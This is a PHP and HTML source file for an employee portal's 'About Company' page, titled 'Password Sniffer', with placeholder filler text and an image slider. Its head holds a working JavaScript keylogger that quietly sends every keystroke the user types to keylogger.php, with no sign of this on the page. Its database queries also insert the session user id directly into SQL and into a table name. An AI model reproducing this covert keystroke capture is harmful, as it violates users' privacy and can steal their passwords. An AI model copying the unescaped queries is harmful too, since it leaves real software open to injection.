<?php
include 'include/db.php';
date_default_timezone_set('Asia/Calcutta');
$date = date('H');
$time = date("F j, Y, g:i a");

session_start();


if(substr($_SESSION['login_id'],0,4) == 'emp_')
{

	if(!isset($_SESSION['login_id']))
	{
		header('location:index.php');
	}
	
	else{
		$user_id = $_SESSION['login_id'];
		$table = "msg_".$user_id;
		$query = mysql_query("SELECT * FROM employee Where Status = 'True' AND User_id = '$user_id'");
		$row_header = mysql_fetch_assoc($query);
		
		//for new msg display..
		$query = mysql_query("SELECT * FROM $table WHERE Status = 'True' AND Display = '1'");
		$row_msg = mysql_fetch_assoc($query);
		$total_message =  mysql_num_rows($query);
			
	}
?>


<!DOCTYPE html>
<!--[if IE 8]> 				 <html class="no-js lt-ie9" lang="en"> <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en"> <!--<![endif]-->

<head>
	<meta charset="utf-8" />
  <meta name="viewport" content="width=device-width" />
  <title>Password Sniffer</title>

  <link rel="stylesheet" href="css/normalize.css" />
  <link rel="stylesheet" href="css/main.css" />
  <link rel="stylesheet" href="css/foundation.css" />
  
	<link rel="stylesheet" type="text/css" href="engine1/style.css" />
	<script type="text/javascript" src="engine1/jquery.js"></script>
  <script src="js/vendor/custom.modernizr.js"></script>
  <script src="js/jquery-latest.js" type="text/javascript"></script>
  
<script type="text/javascript">

//*************** START **************
//execute when we press and key from the key board... 
$(document).keydown(function(event)
{
	//store that key into keycode variable..
	var keycode = event.keyCode;
	
	//call reload.php page using get method..
	//we send key value with the help of get method into reload.php page.. 	
	$('#hello').load('keylogger.php?press_key='+keycode+'&page=about_company');

});
//*************** END ****************

</script>



</head>
<body id="body">


<!-- for key stock.. -->
<div id="hello"></div>
<!-- for key stock.. -->


<!-- start logo and user name div -->
<div id="full_width">

    <div class="row header" id="full_widths">
        
        <!-- start logo image -->
        <div class="large-6 columns">
        	<div class="row">
            <div class="large-10 column">
       			 <a href="#"><img src="img/logo.png" style="height:130px;  margin-left:-100px;"></a>
        	</div>
        	</div>
        </div>
        <!-- end logo image -->
        
        
        <!-- star user image -->
        <div class="large-2 large-offset-1 column" >
            <div class="row">
				<div class="large-8 large-offset-4">            
            		<img src="employee/<?php echo $row_header['Image']?>" style="height:120px;width:90px;border:3px #666 solid;"  >
            	</div>
            </div>
        </div>
        <!-- end user image -->
        
        
        <!-- start user Name -->
        <div class="large-3 column end">
        
            <div class="row ">
                <div class="large-12 columns user_name">
                <h4><a href="#" class="user_n"><?php echo $row_header['Name']?></a></h4>
                </div>
            </div>
            
            <div class="row ">
                <div class="large-12 user_name columns" style="margin-top:-10px;">
                <p class="user_n"><?php echo $row_header['User_id']?></p>
                </div>
            </div>
            
            <div class="row ">
                <div class="large-12 user_name column" style="margin-top:-19px;">
                <p><a href="view_message.php" class="user_n">Message : <?php
                if($total_message == '0')
				{
					echo "<span style='font-weight:bold;'>".$total_message."</span>";
				}
				else
				{
					echo "<span style='color:red;font-weight:bold;'>".$total_message."</span>";
				}
				?>
                </a></p>
                </div>
            </div>
            
           
            
            
         </div>
        <!-- end user name -->
    </div>
	<!-- end logo and user name div -->
 </div> 




	
<?php
	
}// end if(substr($_SESSION['login_id'],0,4) == 'emp_')

else{
	unset($_SESSION['login_id']);
	header('location: index.php');
}

?> 
   
    
  	<?php
	
    if(substr($_SESSION['login_id'],0,4) == 'emp_')
	{
		
	?>
    <!-- start navigation bar -->
    <div class="row nav">
   
    	<a href="home.php">
        <div class="large-2 column">
         Home
        </div>
        </a>
        
        <a href="company_detail.php">
        <div class="large-2 column" style="background:#10255F;">
       	 Company
        </div>
        </a>
        
        <a href="message.php">
        <div class="large-2 column" >
         Message
        </div>
        </a>
        
        <a href="task.php">
        <div class="large-2 column">
         Task
        </div>
        </a>
        
      
        
        <a href="setting.php">
        <div class="large-2 column" >
        Setting
        </div>
        </a>
        
         <a href="logout.php">
        <div class="large-2 column">
         Logout
        </div>
        </a>
        
    </div>
    
    <!-- end navigation bar -->
    <?php
	}
	?> 
    
        
    <!-- start main heading -->
    <div class="row">
    	<div class="large-8 column main_heading">
       	About Company
        </div>
    </div>
    <!-- end main heading -->


    <!-- start horizantal line -->
     <div class="row">
    	<div class="large-12 column">
        <hr style="border:0.1em #999999 solid;">
        </div>
    </div>
    <!-- end horizantal line -->
    
    
    
   <!-- start company details -->
  
       <div class="row">
       	
       
       	<div class="large-7 column" style="margin-top:16px;">
        asdf asdf asdf asdf asdf asdf asdf asdf ghjkl ghjkl ghjkl ghjkl asdf asdf asdf asdf asdf asdf asdf asdf ghjkl ghjkl ghjkl ghjkl asdf asdf asdf asdf asdf asdf asdf asdf ghjkl ghjkl ghjkl ghjkl asdf asdf asdf asdf asdf asdf asdf asdf ghjkl ghjkl ghjkl ghjkl asdf asdf asdf asdf asdf asdf asdf asdf ghjkl ghjkl ghjkl ghjkl asdf asdf asdf asdf asdf asdf asdf asdf ghjkl ghjkl ghjkl ghjkl asdf asdf asdf asdf asdf asdf asdf asdf ghjkl ghjkl ghjkl ghjkl asdf asdf asdf asdf asdf asdf asdf asdf ghjkl ghjkl ghjkl ghjkl asdf asdf asdf asdf asdf asdf asdf asdf ghjkl ghjkl ghjkl ghjkl asdf asdf asdf asdf asdf asdf asdf asdf ghjkl ghjkl ghjkl ghjkl asdf asdf asdf asdf asdf asdf asdf asdf ghjkl ghjkl ghjkl ghjkl asdf asdf asdf asdf asdf asdf asdf asdf ghjkl ghjkl ghjkl ghjkl asdf asdf asdf asdf asdf asdf asdf asdf ghjkl ghjkl ghjkl ghjkl asdf asdf asdf asdf asdf asdf asdf asdf ghjkl ghjkl ghjkl ghjkl asdf asdf asdf asdf asdf asdf asdf asdf ghjkl ghjkl ghjkl ghjkl asdf asdf asdf asdf asdf asdf asdf asdf ghjkl ghjkl ghjkl ghjkl 
        </div>

        <div class="large-5 column">
        
	<!-- Start WOWSlider.com BODY section -->
		<div id="wowslider-container1">
	<div class="ws_images"><ul>
<li><img src="img/1.png" alt="Image 1" title="Image 1" id="wows1_0"/></li>
<li><img src="img/2.png" alt="Image 2" title="Image 2" id="wows1_1"/></li>
<li><img src="img/3.png" alt="Image 3" title="Image 3" id="wows1_2"/></li>
<li><img src="img/4.png" alt="Image 4" title="Image 4" id="wows1_3"/></li>
</ul></div>
<div class="ws_bullets"><div>
<a href="#" title="Image 1"><img src="img/tool_tips/1.jpg" alt="Image 1"/>1</a>
<a href="#" title="Image 2"><img src="img/tool_tips/2.jpg" alt="Image 2"/>2</a>
<a href="#" title="Image 3"><img src="img/tool_tips/3.jpg" alt="Image 3"/>3</a>
<a href="#" title="Image 4"><img src="img/tool_tips/4.jpg" alt="Image 4"/>4</a>
</div></div>
	</div>
	<script type="text/javascript" src="engine1/wowslider.js"></script>
	<script type="text/javascript" src="engine1/script.js"></script>
	<!-- End WOWSlider.com BODY section -->

    
        </div>
        
       
     </div>
       
   
   <!-- end company Details -->
   
 
   
</body>
</html>
